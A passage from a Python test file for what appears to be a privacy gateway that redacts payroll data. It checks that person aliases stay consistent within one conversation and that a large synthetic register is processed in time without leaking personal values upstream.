    assert doc == {"R": {"ID": [{"@type": "A", "#text": "1"}, {"@type": "B", "#text": "2"}], "N": {"@F": "x"}}}


# --- conversation scope: aliases stable across chunks ---------------------------------------------------------------

def test_aliases_are_consistent_across_chunks_of_one_conversation(gw):
    client, mock = gw
    csv = pay_csv(pay_row(PF=2000))
    env = json.dumps({"source": "india_payroll_register", "format": "csv", "data": csv})
    seen = []
    for conv in ("conv-a", "conv-a", "conv-b"):
        n0 = len(mock.received)
        r = post(client, "payroll_register_check", env, headers={"X-PGW-Conversation-Id": conv})
        assert r.status_code == 200
        seen.append(re.findall(r"\[PERSON_\w+\]", upstream_text(type("M", (), {"received": mock.received[n0:]})())))
    assert seen[0] == seen[1] and seen[0] != seen[2]


# --- (h) timing bound for a large input ----------------------------------------------------------------------------

def test_large_register_within_time_and_output_bounds(gw):
    client, mock = gw
    sy = S.payroll(20000, seed=41, error_rate=0.05)
    env = sy.envelope()
    assert len(env) > 5_000_000
    n0 = len(mock.received)
    t = time.perf_counter()
    r = post(client, "payroll_register_check", env)
    took = time.perf_counter() - t
    assert r.status_code == 200, r.text
    assert took < 30, took
    rec = r.json()["pgw_report"]["records"]
    assert rec["rows"] == 20000 and rec["left"]["listed_rows"] <= 200 and rec["left"]["not_listed"] > 0
    sent = mock.received[n0]
    assert len(sent) < 40_000
    # every value of the first and last rows in every surface form (the full set is covered at smaller sizes)
    assert_no_leak(upstream_text(type("M", (), {"received": [sent]})()), sy, sample=1500)
